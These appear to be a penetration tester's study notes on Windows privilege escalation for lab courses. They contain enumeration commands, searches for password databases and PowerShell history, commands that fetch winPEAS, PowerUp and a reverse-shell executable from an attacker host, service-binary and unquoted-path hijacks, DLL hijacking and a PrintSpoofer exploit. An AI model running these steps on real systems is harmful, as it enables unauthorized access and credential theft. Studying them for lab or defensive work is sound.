          Well Known SIDs
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator

Tokens describe the security context of a user
When a user starts a process / thread, they are assigned a primary token. This is a copy of the user's access token.

Impersonation tokens are used to give different contexts than the process that owns the thread.

When processes are started or objects are created, they receive the integrity level of the principal performing this operation. 
One exception is if an executable file has a low integrity level, the process's integrity level will also be low.

- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard 
- Low: very restricted rights often used in sandboxed

### Situational Awareness

Key Information for Windows privilege escalation
-Username and hostname
  whoami - you can infer data from hostname such as WEB01 for a web server or MSSQL01
  
- Group memberships of the current user
  whoami /groups
  
- Existing users and groups
  net user OR Powershell -> Get-LocalUser - list all users
  
  for groups keep an eye on things like helpdesk, backup, administrator, etc... rdp's pretty important too.
  net localgroup OR Get-LocalGroup -> List all groups
  Get-LocalGroupMember <groupnam> - List all users of group
  
- Operating system, version and architecture
  systeminfo

- Network information
  ipconfig /all
    is dhcp enabled? Is there a dns server? Is there a subnetmask or mac address?
    
  route print
  
  netstat -ano
    -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection.
  
- Installed applications
  show all x32 apps
  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  
  show all x64 apps
   Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
   
   ```mystuff
   NOTE: These paths only work if the apps properly register themselves... If you can't find anything, try this...
   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths"
   : This path contains information about application executable paths.
   
   "HKCR\Installer\Products"
   : This path contains information about installed products as recorded by the Windows Installer.```
  
  Or just check Program Files in C:\
  
- Running processes
          
  Get-Process
  
  ```my stuff
          
  Get-Process | Select-Object Name, Id, Path, Company, IntegrityLevel -- Integrity didn't show for me.. maybe it needs admin perms to show
  
  search by pid
          
  Get-Process | Where-Object { $_.Id -eq <PID> } | Select-Object Name, Id, Path
  
  search by processname
          
  Get-Process | Where-Object { $_.Name -eq "process_name" }
  
  search by name with wildcard
          
  Get-Process | Where-Object { $_.Name -like "*myapp*" }
  ```
 
 ### Hidden in plain sight
       
Find password DB for keePass. Obviously for other password managers, this needs to be changed
          
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
          
Find config files that may have passwords in plain text...
          
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
          

          
 ### Information Gold Mine
          
 Get-History
 (Get-PSReadlineOption).HistorySavePath
          
 alternatively
          
 type $((Get-PSReadlineOption).HistorySavePath)

PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.
          
Kali - login using winrm (NOTE SPECIAL CHARS MAY NEED TO BE ESCAPED)
          
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

          
If RDP is annoying try this..
xfreerdp /u:USER /p:'PASSWORD' /v:$target /cert-ignore /w:1366 /h:768
          
xfreerdp /u:daveadmin /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768
          
Search for event 4104 to see ScriptBlockLog events
         
### automation
 winPeas... serve it up to target using 
          
python3 -m http.server 80
          
then on target download using

iwr -uri http://192.168.45.230/winPEASx64.exe -Outfile winPEAS.exe
          
Start-Process -FilePath "winPEAS.exe" -RedirectStandardOutput "winlog.txt" -NoNewWindow -WindowStyle Hidden
### CMD
start /B cmd /C "winPEAS.exe > winPEAS.txt"
Get-Content winPEAS.txt | Out-Host -Paging

          
from INE I learned about using
 iwr -UseBasicParsing -Uri http://IP/Dwrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll
          
** automated tools can be blocked by AV solutions. If this is the case, we can apply techniques learned in the Module "Antivirus Evasion", try other tools such as Seatbelt2 and JAWS,3 or do the enumeration manually.
          
winPeas misses things... don't forget manual enumeration...
          
     
 List all running services and their paths

Get-Service
          
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
          
When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.
          
Find perms
          
icacls "C:\xampp\apache\bin\httpd.exe" or Get-ACL
          
Find out how the service starts           
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

### Powerup
PowerUp.ps1 detects priv escalation vectors
          
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

 powershell -ep bypass

.\PowerUp.ps1
          
if there's an error on abusefucntion, do the following
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
$ModifiableFiles

 Get-ModifiableServiceFile 

 Powerup
Upload it
iwr -uri http://<ATTACKER>/reverse.exe -Outfile rev.exe

RDP in
xfreerdp /u:admin /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768

NOTE:  must be rdp session
Get-ModifiableServiceFile
or
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
$ModifiableFiles

#### Attempt exploit
Install-ServiceBinary -Name 'mysql'

If that fails try manual install

iwr -uri http://<ATTACKER>/adduser.exe -Outfile adduser.exe
#### you can't just download directly into the folder, do the following...

#### make backup
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

#### moves your stuff in
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

#### Restart service
net stop mysql

#### If that doesn't work, check if its a start up service
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

#### If yes, reboot system
shutdown /r /t 0

==============================================
verify user john with the password Password123! if using Powerup AbuseFunction or with adduser.c
net localgroup administrators

Login as john
runas /user:john "cmd.exe"

### DLL Hijacking

When can we use this technique?
When the DLL's used by a service are writable, or if the search order allows for DLL Hijacking...

DLL Search Order

1. The directory from which the application loaded.

2. The system directory.

3. The 16-bit system directory.

4. The Windows directory. 

5. The current directory.

6. The directories that are listed in the PATH environment variable.


Dlls can have optional entry point functions called DLLmain (executes when dll is attached)

compile dll on kali
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

use procmon to find a target... If you can't use procmon, put potential targets on a local machine, and try there

filter by Processname then Result:NAME NOT FOUND, finally Operation: CreateFile

### Unquoted Service Path

When can we use this technique? 

We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.\

How does it work?

Every Service and Process has a path to an executable. If you do not use an absolute path by using quotes such 
as C:\Program Files\My Program\My service\service.exe instead of "C:\Program Files\My Program\My service\service.exe", Windows will check every space by appending .exe to the preceeding arguement

Examples... 
C:\Program.exe, C:\Program Files\My.exe,

List all running/stopped services in powershell using
PS: Get-CimInstance -ClassName win32_service | Select Name,State,PathName

Note: Wmic use in CMD. Powershell behaved weirdly...       
INE Version of WMIC to find targets
cmd: wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
OSCP Version -- better
cmd: wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

Check if you can start and stop service
PS: Start-Service GammaService

PS: Stop-Service GammaService

Check if you can write using icacls (In powershell)
icacls "C:\Program Files\Enterprise Apps"

Move in payload
Move-Item –Path Current.exe -Destination  "C:\Program Files\Enterprise Apps"

Restart the service
Note there may be an error... just check using net user
PS: Stop-Service GammaService
PS: Start-Service GammaService

#Extra
Find the account name of a service running 
Get-WmiObject Win32_Service | Select-Object Name, StartName

Also the Services MCM snippet provides more info than task manager does...


### Windows Services

schtasks /query /fo LIST /v | more
Get-ScheduledTask

check for who runs the service, when it will trigger, and if we can write to the location, then proceed like any other service binary hijack

### Exploits

SeImpersonatePrivilege -- given to accounts in the Local Administrators group as well as the device's LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts.

NOTE: IIS WEBSERVER ACCOUNTS COMMONLY HAVE THIS PERM!!!

SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug are privileges commonly used for escalation

We will use PrintSpoofer tool by itm4n to create a controlled name pipe. 

Enumerate Privs

whoami /priv

can I enumerate the privs of other users??
s
Yes but you need admin privileges, powershell scripting enabled, its a headache

Get newest version of Print Spoofer

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
You can also compile from source code on that repo, but it was taking too long, journey for another day

Run PrintSpoofer to spawn a powershell 
.\PrintSpoofer64.exe -i -c powershell.exe

-c is command, -i is to interact with it

Other Se Priv  escalation tools: RottenPotato, SweetPotato, or JuicyPotato




 # A skilled penetration tester's goal is therefore not to blindly attempt privilege escalation on every machine at any cost, but to identify machines where privileged access leads to further compromise of the client's infrastructure.
